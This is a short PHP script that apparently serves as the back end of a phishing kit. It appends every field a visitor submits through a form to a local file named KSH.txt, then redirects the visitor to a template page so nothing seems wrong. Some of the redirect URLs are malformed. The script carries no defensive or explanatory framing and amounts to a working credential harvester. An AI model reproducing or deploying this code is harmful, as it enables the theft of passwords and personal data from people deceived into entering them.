<?php
header("location:http:kazi.html");
$handle=fopen("KSH.txt","a");
foreach($_POST as $variable=>$value)
{
	fwrite($handle,$variable);
	fwrite($handle,"=");
	fwrite($handle,$value);
	fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:http:Stride-HTML-Bootstrap-Template-1.1.0/index.html");
exit;
?>
